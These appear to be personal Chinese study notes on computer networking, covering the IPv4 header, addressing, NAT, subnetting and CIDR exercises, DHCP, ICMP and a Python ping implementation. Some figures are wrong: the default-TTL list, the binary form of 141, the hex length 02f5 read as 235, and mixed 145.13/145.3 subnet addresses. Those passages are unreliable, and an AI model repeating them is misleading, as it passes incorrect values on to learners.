因特网广泛使用的数据链路层协议都不适用确认和重传机制，即不要求数据链路层向上层提供可靠传输的服务(因为这要付出的代价太高，不合算)。如果在数据链路层传输数据时除了差错并且需要进行改正，那么改正差错的任务就由上层协议(如，运输层TCP协议)来完成。实验证明，这样可以提高通信效率。

### 2.3.2 数据链路层提供的服务

1.**无确认 无连接 服务**（ Unacknowledged connectionless ）

- 接收方不对收到的帧进行确认

- 适用场景：误码率低的可靠信道；实时通信；
- 网络实例：以太网

2.**有确认 无连接 服务**（ Acknowledged connectionless ）

- 每一帧都得到单独的确认

- 适用场景：不可靠的信道（无线信道）
- 网络实例：802.11

3.**有确认 有连接 服务**（ Acknowledged connection-oriented ）

- 适用场景：长延迟的不可靠信道

## 2.4 网络层

### 2.4.1 网络层概述

#### 简介

网络层在数据链路层提供的两个相邻端点之间的数据帧的传送功能上，进一步管理网络中的数据通信，将数据设法从源端经过若干个中间节点传送到目的端，从而向运输层提供最基本的端到端的数据传送服务。

#### 关键功能

- 路由（控制面）
  - 选择数据报从源端到目的端的路径
  - 核心：路由算法与协议
- 转发（数据面）
  - 将数据报从路由器的输入接口传送到正确的输出接口

### 2.4.2 IP协议

#### 简介

IP(网际互连协议，Internet Protocol)是TCP/IP协议族中最为核心的协议。所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输。网际协议IP又称为Kahn-Cerf协议，因为这个重要协议正是Robert Kahn和Vint Cerf二人共同研发的，这两位学者在2005年获得图灵奖。

IP协议分为IPV4和IPV6，笔记主要讨论的是IPV4，IPV6是IPV4的后继版本。

IP协议的两个**基本功能**：

- 寻址(addressing)
- 分片(fragmentation)

#### 报文格式

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505182529435.png" alt="IP报文格式" style="zoom:50%;" />

- **版本**：占4位，指IP协议的版本。通信双方使用的IP协议的版本必须一致。目前广泛使用的IP协议版本号为4（即IPv4），以后要使用IPv6（即版本6的IP协议）。

- **首部长度**：占4位，可表示的0~15，单位是4B。因为IP首部的固定长度是20字节，因此首部长度字段的最小值是5（即二进制表示的首部长度是0101）。而当首部长度为最大值1111时（即十进制数的15），就表明首部长度达到最大值15个32位字长，即60字节。当IP分组的首部长度不是4字节的整数倍时，必须利用最后的填充字段加以填充。因此IP数据报的数据部分永远在4字节的整数倍时开始。首部长度限制为60字节的缺点是有时可能不够用，但这样做是希望用户尽量减少开销。最常用的首部长度是20字节（即首部长度为0101），这时不使用任何选项。

- **区分服务**：占8位，用来获得更好的服务。这个字段在旧标准中叫做服务类型，但实际上一直没有被使用过。1998年IETF把这个字段改名为区分服务DS（DifferentiatedServices)。只有在使用区分服务时，这个字段才起作用，在一般的情况下都不使用这个字段。 

- **总长度**：占16位，指首部和数据之和的长度，单位为字节。总长度字段为16位，因此数据报的最大长度为2^16-1=65535字节。

- **标识**（identification）占16位。IP软件在存储器中维持一个计数器，每产生一个数据报，计数器就加1，并将此值赋给标识字段。当数据报由于长度超过网络的MTU而必须分片时，这个标识字段的值就被复制到所有的数据报片的标识字段中。相同的标识字段的值使分片后的各数据报片最后能正确地重装成为原来的数据报。

- **标志**（flag）占3位，但目前只有低两位有意义。标志字段中的最低位记为MF（More Fragment)。MF=1即表示后面“还有分片”的数据报。MF=0表示这已是若干数据报片中的最后一个。标志字段中间的一位记为DF（Don't Fragment)，意思是“不能分片”。只有当DF=0时才允许分片。

- **片偏移**占13位。片偏移指出：较长的分组在分片后，某片在原分组中的相对位置。也就是说，相对于用户数据字段的起点，该片从何处开始。片偏移以8个字节为偏移单位。这就是说，除了最后一个分片，长度一定是8字节（64位）的整数倍，最后一个分片可能是8字节（64位）的整数倍。

- **生存时间**TTL（Time To Live，生存时间），是IP协议包中的一个值，指定数据包被路由器丢弃之前允许通过的网段数量，数据包每经过路由器转发一次都至少要把TTL减1，TTL通常表示包在被丢弃前最多能经过的路由器个数。当记数到0时，路由器决定丢弃该包，并发送一个ICMP报文给最初的发送者。有很多原因使包在一定时间内不能被传递到目的地。例如，不正确的路由表可能导致包的无限循环。

  TTL 是由发送主机设置的，TTL字段值可以帮助我们识别操作系统类型。下面是默认操作系统 TTL。

  ```shell
  § Liunx 64
    redhat 50
    centos 60
  § Windows 2000/NT 128
  § Windows系列 32
  § Unix系列 255
  ```

  我们可以更改注册表设置TTL的值，可以修改，但不能大于十进制的255，使用ping发现的TTL可以粗略判断对方是什么操作系统，中间经过了多少个路由器。

- **协议**占8位，协议字段指出此数据报携带的数据是使用何种协议，以便使目的主机的IP层知道应将数据部分上交给哪个协议进行处理。至少记住TCP和UDP（腾讯安全工程师笔试题)。

  | 协议名 | ICMP | IGMP | IP   | TCP  | EGP  | IGP  | UDP  | IPV6 | ESP  | OSPF |
  | ------ | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
  | 字段值 | 1    | 2    | 4    | 6    | 8    | 9    | 17   | 41   | 50   | 89   |

- **首部检验和**占16位。这个字段只检验数据报的首部，但不包括数据部分。这是因为数据报每经过一个路由器，路由器都要重新计算一下首部检验和（一些字段，如生存时间、标志、片偏移等都可能发生变化）。不检验数据部分可减少计算的工作量。

- **源地址**占32位。

- **目的地址**占32位。

- **选项**：可扩充部分，具有可变长度，定义了安全性、严格源路由、松散源路由、记录路由、时间戳等选项

- **填充**：全0，把首部补成4B的整数倍。

#### IP数据报分片

##### 分片原因

数据报长度大于传输链路的MTU。

MTU（Maximum Transmission Unit）, 最大传输单元

- 链路MTU

- 路径MTU (Path MTU)

##### 分片策略

- 允许途中分片：根据下一跳链路的MTU实施分片

- 不允许途中分片：发出的数据报长度小于路径MTU（路径MTU发现机制）

##### 重组策略

- 途中重组，实施难度太大
- 目的端重组（互联网采用的策略）
- 重组所需信息：原始数据报编号、分片偏移量、是否收集所有分片

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602143511534.png" alt="image-20220602143511534" style="zoom:50%;" />

##### IPv4分片策略

- IPv4分组在传输途中可以多次分片
- 源端系统，中间路由器（可通过标志位设定是否允许路由器分片，DF标志位）
- IPv4分片只在目的IP对应的目的端系统进行重组
- IPv4分片、重组字段在基本IP头部
- 标识、标志、片偏移
- IPv6分片机制有较大变化（见IPv6部分的介绍）

注：分组 (packet) 与 帧(frame)的关系如下

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602143658000.png" alt="image-20220602143658000" style="zoom:50%;" />

#### IP协议基本功能

##### 网络层基本功能

- 支持多跳寻路将IP数据报送达目的端：**目的IP地址**
- 表明发送端身份：**源IP地址**
- 根据IP头部协议类型，提交给不同上层协议处理：**协议**

##### 其它相关问题

- 数据报长度大于传输链路的MTU的问题，通过**分片机制**解决：**标识、标志、片偏移**
- 防止循环转发浪费网络资源（路由错误、设备故障…），通过**跳数限制**解决：**生存时间TTL**
- IP报头错误导致无效传输，通过**头部机校验**解决：**首部校验和**

#### IPv4地址

##### 分类

IP地址表示如下：

IP地址::={<网络号>，<主机号>}

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505183122108.png" alt="image-20220505183122108" style="zoom:50%;" />


下面是一个C类IP地址

```
11011111 00000001 00000001 00000001
```

二进制对于人类来说很难记忆，所以我们将IP地址分为上面的4个部分，每个部分8位(0-255)，使用.分隔，就是点分十进制。

- A类IP地址范围**1.0.0.1--126.255.255.254**（二进制表示为：00000001 00000000 00000000 00000001 - 01111110 11111111 11111111 11111110）

- B类IP地址范围**128.1.0.1--191.254.255.254**（二进制表示为：10000000 00000001 00000000 00000001 - 10111111 11111110 11111111 11111110）
- C类IP地址范围**192.0.1.1-- 223.255.254.254**（二进制表示为: 11000000 00000000 00000001 00000001 - 11011111 11111111 11111110 11111110）
- D类IP地址范围**224.0.0.1-- 239.255.255.254**（二进制表示为：11100000 00000001 00000001 00000001 - 11101111 11111111 11111111 11111110）

A类是7位，应该是0-127呀，为什么是1-126呢？因为一些规定，有些ip作为了特殊ip，不能作为A类地址的网络。

以下特殊IP需要单独记忆一下：

| 网络号 | 主机号             | 源地址使用 | 目的地址使用 | 代表的意思                                   |
| ------ | ------------------ | ---------- | ------------ | -------------------------------------------- |
| 0      | 0                  | 可以       | 不可         | 在本网络上的本主机（见DHCP协议）             |
| 0      | host-id            | 可以       | 不可         | 在本网络上的某台主机host-id                  |
| 全1    | 全1                | 不可       | 可以         | 只在本网络上进行广播（各路由器均不转发）     |
| net-id | 全1                | 不可       | 可以         | 对net-id上的所有主机进行广播                 |
| 127    | 非全0或全1的任何数 | 可以       | 可以         | 用于本地软件环回测试（测试网卡和TCP/IP软件） |

除去特殊ip后：

| 网络类型 | 最大可指派的网络数 | 第一个可指派的网络号 | 最后一个可指派的网络号 | 每个网络中的最大主机数 |
| -------- | ------------------ | -------------------- | ---------------------- | ---------------------- |
| A        | 126(2^7-2)         | 1                    | 126                    | 16777214               |
| B        | 16383(2^14-1)      | 128.1                | 191.255                | 65534                  |
| C        | 2097151(2^21-1)    | 192.0.1              | 223.255.255            | 254                    |

网络号全0表示本网络

主机号全为0表示本网络，主机号全为1表示广播地址，16777214是2^24-2，去掉全0和全1，其他同理。

**私有IP**就是本地网络的IP，是为了节省IP而专门划分出来的仅用于局域网主机通信和路由器的IP。路由器不会转发目的地址是私有地址的数据报。

| 地址类别 | 地址范围                      | 网段个数 |
| -------- | ----------------------------- | -------- |
| A类      | 10.0.0.0---10.255.255.255     | 1        |
| B类      | 172.16.0.0---172.31.255.255   | 16       |
| C类      | 192.168.0.0---192.168.255.255 | 256      |

我们平常用的大多是C类的，如果在使用电脑，可以打开命令窗口查看一下，Windows是使用ipconfig、Linux是使用ifconfig。

##### 网络地址转换NAT

**定义**

网络地址转换(NAT)用于解决IPv4地址不足的问题，是一种将私有（保留）地址转化为公有IP地址的转换技术。

NAT路由器：在专用网连接到因特网的路由器上安装NAT软件，安装了NAT软件的路由器叫NAT路由器，它至少有一个有效的外部全球IP地址。NAT路由器内部会维护一个NAT表，进行本地ip：端口到外部网络ip：端口的映射。例如，192.168.31.164:50001->110.255.250.111:40001，那么访问百度，就是本地数据包发给路由器，路由器转发数据包，百度响应后，发给路由器，路由器收到后再根据是局域网内的哪个设备请求的再给予分发数据包进行回应。

**NAT工作机制**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602200956171.png" alt="image-20220602200956171" style="zoom:50%;" />

- **出数据报**：外出数据报用NAT IP地址(全局), 新port#替代 源IP地址(私有), port#
- **NAT转换表**：每个(源IP地址, port#)到(NAT IP地址, 新port#)映射项
- **入数据报**：对每个入数据报的地址字段用存储在NAT表中的(源IP地址, port#)替代对应的(NAT IP地址,新port#)
- NAT根据不同的IP上层协议进行NAT表项管理TCP，UDP，ICMP

- 传输层TCP/UDP拥有16-bit 端口号字段，所以一个WAN侧地址可支持60,000个并行连接

**NAT的优势**

- 节省合法地址，减少地址冲突
- 灵活连接Internet
- 保护局域网的私密性

##### 子网划分与子网掩码

两级IP有一些缺点：

- 第一，IP地址空间的利用率有时很低。
- 第二，给每一个物理网络分配一个网络号会使路由表变得太大因而使网络性能变坏。
- 第三，两级IP地址不够灵活。

例如，一个单位申请了一个B类地址，但是公司没有那么多台电脑，但又可能会扩充，这个时候可能会按照部门进行子网的划分，增加部门内部人员或增加部门就比较方便，此时，单位内部的网络IP可表示为：

IP地址::={<网络号>，<子网号>，<主机号>}

###### 子网划分

- **子网划分**(subnetting)，在网络内部将一个网络块进行划分以供多个内部网络使用，对外仍是一个网络
- **子网**(subnet )，一个网络进行子网划分后得到的一系列结果网络称为子网
- 子网掩码(subnet mask )，与 IP 地址一一对应，是32 bit 的二进制数，置1表示网络位，置0表示主机位
- 子网划分减少了 IP 地址的浪费、网络的组织更加灵活、便于维护和管理

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602145702389.png" alt="image-20220602145702389" style="zoom:50%;" />

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602145723309.png" alt="image-20220602145723309" style="zoom:50%;" />

下面用例子说明划分子网的概念。下图表示某单位拥有一个B类IP地址，网络地址是145.13.0.0（网络号是145.13）。目的地址为145.13.x.x的数据报都被送到这个网络上的路由器R1。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505190545764.png" alt="image-20220505190545764" style="zoom:50%;" />

现把单位网络划分为三个子网。这里假定**子网号占用8位**，因此在增加了子网号后，主机号就只有8位。所划分的三个子网分别是：145.13.3.0，145.13.7.0和145.13.21.0。在划分子网后，整个网络对外部仍表现为一个网络，其网络地址仍为145.13.0.0。但网络145.13.0.0上的路由器R1在收到外来的数据报后，再根据数据报的目的地址把它转发到相应的子网。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505190612034.png" alt="image-20220505190612034" style="zoom:50%;" />

子网可有2^8共256个，现分配了3、7、21，还可分配253个。

子网145.13.3.0可有主机共2^8-2=254个，145.3.3.1-145.3.3.9以及145.3.3.102-145.3.3.254可以分配给新来本部门的同事。其余两个子网同理。

###### 子网掩码

子网掩码，主机号部分全0，剩下全1。可用于和ip相与，判断是否属于本网络。上面的子网掩码为11111111 11111111 11111111 00000000，写成点分十进制为255.255.255.0。

**例题：**

已知IP地址是141.14.72.24，子网掩码是255.255.192.0，求网络地址。

72的二进制为01001000，192的二进制为11000000，相与后为01000000，即64，故网络地址为141.14.64.0。

主机起始ip：01110010 00001110 01000000 00000001  141.14.64.1

主机结束ip：01110010 00001110 01111111 111111110   141.14.127.254

**例题：**

某主机的IP地址为180.80.77.55，子网掩码为255.255.252.0。若该主机向其所在子网发送广播分组，则目的地址可以是（）.
A.180.80.76.0     B.180.80.76.255      C.180.80.77.255     D.180.80.79.255

**解析：**77的二进制01001101，252的二进制11111100，相与后为01001100，十进制为76，广播分组为主机号全1，即第三个为01001111（79），第四个为255，所以选D。

##### CIDR（无类别域间路由）

CIDR(Classless Inter-Domain Routing)是一个用于给用户分配IP地址以及在互联网上有效地路由IP数据包的对IP地址进行归类的方法。

**IP地址::={<网络前缀>，<主机号>}，CIDR写法为ip/网络前缀位数**，例如，128.14.32.7/20。

128.14.32.7写成二进制 10000000 00001110 00100000 00000111，其中下划线加粗的20位就是网络前缀，本网络

开始地址：10000000 00001110 00100000 00000000  128.14.32.0

结束地址：10000000 00001110 00101111 11111111     128.14.47.255

当然，还是全0表示本网络，全1为广播地址，不能分配给主机。

- 一个 CIDR 地址块可以表示很多地址，这种地址的聚合常称为**路由聚合**（route aggregation），也称为**构成超网 (supernet)**
- 聚合技术在Internet中大量使用，它允许前缀重叠，数据包按具体路由的方向发送，即具有最少IP地址的**最长匹配前缀**
- **最长匹配前缀**：使用CIDR时，查找路由表可能得到几个匹配结果，应选择具有最长网络前缀的路由。前缀越长，地址块越小，路由越具体。

> 注：当路由器收到一个IP数据包时，它会将数据包的目的IP地址与自己本地路由表中的所有路由表进行**逐位（Bit-By-Bit）对比**，直到找到**匹配度最长**的条目，这就是**最长前缀匹配机制**。（路由比对之前会用相应路由的目的网络掩码进行逻辑与运算，再拿结果与路由路径比对）

**例题：**

路由器RO的路由表见下表：若进入路由器RO的分组的目的地址为132.19.237.5，请问该分组应该被转发到哪一个下一跳路由器（）。
 A.R1             B.R2            C.R3             D.R4

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505191331391.png" alt="image-20220505191331391" style="zoom:50%;" />

**解析：**网络前缀为8位，132.19.237.5所在目的网络为132.0.0.0，**匹配**；网络前缀为11位，132.19.237.5(19的二进制为00010011)所在目的网络为132.0.0.0，**匹配**；网络前缀为2位，132.19.237.5(237的二进制为11101101)所在目的网络为132.19.236.0，**不匹配**。故，选择B

**例题：**

某网络的IP地址空间为192.168.5.0/24，采用定长子网划分，子网掩码为255.255.255.248，则该网络中的最大子网个数、每个子网内的最大可分配地址个数分别是（）。
 A. 32，8                   B. 32，6                 C. 8，32                 D. 8，30

**解析：**248的二进制为11111000，故后三位为主机号，2^3=8，由于全0和全1不可分配，故选B。选项不是很好，应该有个30 6，注意CIDR的子网是全可以用的，不用管全0和全1。

#### 实战

访问：http://www.cxtuku.com/search.php?q=lady_killer9

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505192137105.png" alt="image-20220505192137105" style="zoom: 33%;" />

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505193122435.png" alt="image-20220505193122435" style="zoom: 33%;" />

- 版本：0100，4，表示IPv4
- 首部长度：0101，5，单位4B，故首部长度20B
- 总长度：02f5，235，总长度235B
- 标志，片偏移：40，二进制为010000....，DF=1，MF=0，禁止分片，后面没有分片，片偏移为0
- TTL：即128s。
- 协议：06，即TCP，关于TCP的学习
- 校验和：0000
- 源IP：0a674ccb，二进制为 00001010 01100111 01001100 11001011，点分十进制为10.103.76.203
- 目的IP：3de80a81，步骤同上，IP见图

#### 参考

《计算机网络第七版 谢希仁》 第4.2-4.3节

### 2.4.3 DHCP协议

#### 2.4.3.1 简介

动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于OSI模型的应用层，使用UDP协议工作，主要用于自动分配IP地址给用户，方便管理员进行统一管理。

DHCP服务器端使用67/udp，客户端使用68/udp。DHCP 运行分为四个基本过程，分别为请求 IP 租约、提供 IP 租约、选择 IP 租约和确认 IP 租约。客户端在获得了一个 IP 地址以后，就可以发送一个 ARP 请求来避免由于 DHCP 服务器地址池重叠而引发的 IP 冲突。

工作模式：客户/服务器模式（ C/S ）

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602195305544.png" alt="image-20220602195305544" style="zoom:50%;" />

- DHCP 客户从UDP端口68以广播形式向服务器发送发现报文（DHCPDISCOVER）
- DHCP 服务器广播发出提供报文（DHCPOFFER）
- DHCP 客户从多个DHCP服务器中选择一个，并向其以广播形式发送DHCP请求报文（DHCPREQUEST）
- 被选择的DHCP服务器广播发送确认报文（DHCPACK)

#### 2.4.3.2 DCHP报文格式

<img src="C:/Users/86184/%E6%A1%8C%E9%9D%A2/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99/%E5%9B%BE%E7%89%87/f13b8bc2410e0ce8874e342134c1303.jpg" alt="f13b8bc2410e0ce8874e342134c1303" style="zoom: 33%;" />

<img src="C:/Users/86184/%E6%A1%8C%E9%9D%A2/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99/%E5%9B%BE%E7%89%87/8c5cded67b106b1b13e2cedd6c5f0f8.jpg" alt="8c5cded67b106b1b13e2cedd6c5f0f8" style="zoom:33%;" />

#### 2.4.3.3 参考链接

-   [DHCP Wiki](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol)

#### RFC

-   [RFC 2131 Dynamic Host Configuration Protocol](https://tools.ietf.org/html/rfc2131)

-   [RFC 2132 DHCP Options and BOOTP Vendor Extensions](https://tools.ietf.org/html/rfc2132)

-   [RFC 3046 DHCP Relay Agent Information Option](https://tools.ietf.org/html/rfc3046)

-   [RFC 3397 Dynamic Host Configuration Protocol (DHCP) Domain Search Option](https://tools.ietf.org/html/rfc3397)

-   [RFC 3442 Classless Static Route Option for Dynamic Host Configuration Protocol (DHCP) version 4](https://tools.ietf.org/html/rfc3442)

-   [RFC 3942 Reclassifying Dynamic Host Configuration Protocol Version Four (DHCPv4) Options](https://tools.ietf.org/html/rfc3942)

-   [RFC 4242 Information Refresh Time Option for Dynamic Host Configuration Protocol for IPv6](https://tools.ietf.org/html/rfc4242)

-   [RFC 4361 Node-specific Client Identifiers for Dynamic Host Configuration Protocol Version Four](https://tools.ietf.org/html/rfc4361) [(DHCPv4)](https://tools.ietf.org/html/rfc4361)

-   [RFC 4436 Detecting Network Attachment in IPv4 (DNAv4)](https://tools.ietf.org/html/rfc4436)

### 2.4.4 ICMP协议

#### 2.4.4.1 简介

ICMP（Internet Control Message Protocol，网际控制报文协议）是TCP/IP协议簇的一个子协议，用于在**主机、路由器**之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。

- ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告
- 由主机和路由器用于网络层信息的通信
- ICMP 报文携带在IP 数据报中： IP上层协议号为1

#### 2.4.4.2 报文格式

ICMP报文分为两类：一类通知出错原因 ，一类用于诊断查询。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505195932059.png" alt="image-20220505195932059" style="zoom:50%;" />

- 类型：占一字节，标识ICMP报文的类型，从类型值来看ICMP报文可以分为两大类。第一类是取值为1~127的差错报文，第2类是取值128以上的信息报文。
- 代码：占一字节，标识对应ICMP报文的代码，它与类型字段一起共同标识了ICMP报文的详细类型。
- 校验和：占两个字节，这是对包括ICMP报文数据部分在内的整个ICMP数据报的校验和，以检验报文在传输过程中是否出现了差错

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602201608244.png" alt="image-20220602201608244" style="zoom:50%;" />

##### 差错报文

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505200037648.png" alt="image-20220505200037648" style="zoom:50%;" />

###### 常见类型

- 3    目标/终点不可达：无法交付。当路由器或主机不能交付数据报时就向源点发送终点不可达报文。
- 4    源点抑制
- 5    **重定向**/改变路由：更好路由。路由器把改变路由报文发送给主机，让主机知道下次应将数据报发送给另外的路由器（可通过更好的路由）。
- 11   **超时**：TTL=0。当路由器收到生存时间TTL=0的数据报时，除丢弃数据包外，还要向源点发送时间超过报文。当终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，并向源点发送时间超过报文。
- 12  参数问题：首部字段有问题。当路由器或目的主机收到的数据报的首部中有的字段的值不正确时，就丢弃该数据报，并向源点发送参数问题报文。

###### 不发送ICMP差错报文的情况

- 对ICMP差错报告报文不再发送ICMP差错报告报文（否则可能死循环）
- 对第一个分片的数据报片的所有后续数据报片都不发送ICMP差错报告报文。
- 目的地址是多/广播地址的数据报都不发送ICMP差错报告报文。
- 作为链路层广播的数据报都不发送ICMP差错报告报文。
- 对具有特殊地址(如127.0.0.0或0.0.0.0)的数据报不发送ICMP差错报告报文。

##### 询问报文

###### 常见类型

- 0    **回送应答**：收到回送请求报文的主机必须给源主机或路由器发送ICMP回送应答报文，表示本身可达以及自身状态。
- 8    **回送请求**：主机或路由器向特定目的主机发出的询问，测试目的主机是否可达以及了解其相关状态。
- 13  时间戳请求：请某个主机或路由器回答当前的日期和时间，用来进行时钟同步和测量时间。
- 14  时间戳响应：收到时间戳请求报文的主机回答当前的日期和时间，用来进行时钟同步和测量时间。

#### 实战

##### 简单Ping命令实现

PING（Packet InterNet Groper）分组网间探测，用来测试两台主机之间的连通性。当然，也可能由于**防火墙或具有白名单功能的路由器**而无法Ping通。

###### 抓包

打开WireShark，筛选icmpv6数据报，cmd命令，ping一下www.ynu.edu.cn。

![image-20220505200659490](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505200659490.png)

（以上为ping云南大学官网的结果）

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505201759046.png" alt="image-20220505201759046" style="zoom: 33%;" />

(以上为回送请求报文)
类型：表示回送请求类型。
代码：0(00)。
校验和：0xd3ac[correct]，校验正确。
Identifier、Sequence number：00 01 1。
数据：以上图片蓝色部分

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505201928275.png" alt="image-20220505201928275" style="zoom: 33%;" />

（以上为回送应答报文）
类型：表示回送请求类型。
代码：0(00)。
校验和：0xd2ac[correct]，校验正确。
Identifier、Sequence number：0x0001 1。
数据：如上图蓝色阴影部分。
**综上**，Ping命令测试两个主机之间的连通性，使用了ICMP发送请求和回答报文。

###### 手算校验和

ICMP报文中的各个部分中，校验和是相对较难的。先看一下如何计算。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505202426231.png" alt="image-20220505202426231" style="zoom: 50%;" />
首先，校验和字段置为0，然后，对首部中每个16bit进行二进制反码求和，结果存在校验和字段中。

回送请求报文

```
08 00 4d 54 00 01 00 07 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 61 62 63 64 65 66 67 68 69
```

校验码置0

```
08 00 00 00 00 01 00 07 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 61 62 63 64 65 66 67 68 69
```

16bit一组

```
0800 0000 0001 0007 6162 6364 6566 6768 696a 6b6c 6d6e 6f70 7172 7374 7576 7761 6263 6465 6667 6869
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505202802174.png" alt="image-20220505202802174" style="zoom:50%;" />

按列计算，右侧第一列加和结果为7(111)，剩1，进11，右侧第二列加和结果为9+1（进位）=10(1010)，剩0进101。同理，最后将超出16位部分加和，结果回加到低位，得到求和结果，取反得到校验和。不习惯按列加的可以两两相加（待加个数超过16个时没有按列快，因为按列总是16列)，以下代码使用的是**两两加和**。

###### 实现ping的全部代码（python）

```python
"""
--coding:utf-8--
@File: Ping.py
@Author:frank yu
@DateTime: 2020.12.13 10:35
@Contact: frankyu112058@gmail.com
@Description:Implement of Ping
"""
import random
import socket
import struct
import time


def checksum(msg):
    """
    :param msg:icmp message(bytes)
    :return:checksum(bytes)
    """
    check_sum = 0
    n = len(msg)

    def carry_around_add(a, b):
        c = a + b
        return (c & 0xffff) + (c >> 16)
     
    for i in range(0, n, 2):
        w = msg[i] + (msg[i + 1] << 8)
        check_sum = carry_around_add(check_sum, w)
    res = ~check_sum & 0xffff
    res = res >> 8 | (res << 8 & 0xff00)
    return res

def icmp_packet(sequence_number):
    """
    :param sequence_number:
    :return: binary of icmp packet
    """
    icmp_type = 8  # ICMP Echo Request
    icmp_code = 0  # zero
    icmp_checksum = 0  # set to zero first
    icmp_Identifier = 1  # Identifier
    icmp_Sequence_number = sequence_number
    icmp_Data = b'abcdefghijklmnopqrstuvwabcdefghi'  # data
    icmp_message = struct.pack('>2B3H32s', icmp_type, icmp_code, icmp_checksum, icmp_Identifier, icmp_Sequence_number,
                               icmp_Data)
    icmp_checksum = checksum(icmp_message)
    icmp_message = struct.pack('>2B3H32s', icmp_type, icmp_code, icmp_checksum, icmp_Identifier, icmp_Sequence_number,
                               icmp_Data)
    return icmp_message


def icmp_request(dst_addr, pkt, timeout=2):
    """
    send icmp packet and return socket for listening
    :param timeout: timeout
    :param dst_addr: ip of destination address
    :param pkt: packet of icmp
    :return: socket of icmp,time
    """
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_socket.settimeout(timeout)
    icmp_socket.sendto(pkt, (dst_addr, 80))
    send_time = time.time()
    return icmp_socket, send_time


def icmp_reply(icmp_socket, send_time, sequence_num):
    """
    monitor the icmp socket and return how much time spent if receives reply msg
    :param icmp_socket:socket which sent icmp msg before
    :param send_time: time when send icmp request
    :param sequence_num:sequence num
    :return:time and TTL/-1,-1
    """
    try:
        recv_pkt, addr = icmp_socket.recvfrom(1024)
        # print(recv_pkt)
        recv_time = time.time()
        icmpHeader = recv_pkt[20:28]
        type, _, _, _, sequence = struct.unpack(">2B3H", icmpHeader)
        if type == 0 and sequence == sequence_num:
            return recv_time - send_time, recv_pkt[8]
    except socket.timeout:
        return -1, -1


def ping(host):
    """
    :param host:domain name or ip addr
    :return: None
    """
    Sequence_number = random.randint(0, 10 ** 4)
    # 若为ip，不变；若为域名，转为ip
    try:
        dst_addr = socket.gethostbyname(host)
    except socket.gaierror:
        print(f'something wrong, please check your input.')
        exit(0)
    miss, short, long, alltime = 0, 10 ** 9, 0, []
    print(f"正在 Ping {host} [{dst_addr}] 具有 32 字节的数据:")
    for i in range(0, 4):
        # 构造icmp数据包
        icmp_pkt = icmp_packet(Sequence_number + i)
        # print(icmp_pkt)
        # 发送并记录时间
        icmp_socket, send_time = icmp_request(dst_addr, icmp_pkt)
        # 接收并计算时间差
        times, TTL = icmp_reply(icmp_socket, send_time, Sequence_number + i)
        if times >= 0:
            print(f"来自 {dst_addr} 的回复: 字节=32 时间={int(times * 1000)}ms TTL={TTL}")
            if short > times:
                short = times
            if long < times:
                long = times
            alltime.append(times * 1000)
            time.sleep(1)
        else:
            print("请求超时。")
            miss += 1
    print()
    print(f'{dst_addr} 的 Ping 统计信息:\n'
          f'    数据包: 已发送 = 4，已接收 = {4 - miss}，丢失 = {miss} ({int(miss / 4 * 100)}% 丢失)，')
    if miss < 4:
        print('往返行程的估计时间(以毫秒为单位):\n'
              f'    最短 = {int(short * 1000)}ms，最长 = {int(long * 1000)}ms，平均 = {int(sum(alltime) / (4 - miss))}ms')
    return None


if __name__ == '__main__':
    host = input('please input domain name or ip addr:')
    ping(host)
```


结果如下：

![image-20220505204026533](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505204026533.png)

主机A ping 主机B ---> 构建 ICMP 包 ----> 构建 IP 分组 ----> 解析硬件地址封装成帧 ----> 物理层发送 ----> 网络层传输 ----> 到达主机B ----> 提取IP数据包交给IP层协议 ----> 提取信息交给ICMP协议，构建ICMP应答包 ----> 发送给主机A

##### Traceroute

这是UNIX系统中的名字，在Windows中是**tracert**。

一个分组从源点到终点的路，使用了ICMP时间超过差错报告报文。

###### 抓包

![image-20220505230528661](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505230528661.png)

（tracert 百度抓包）

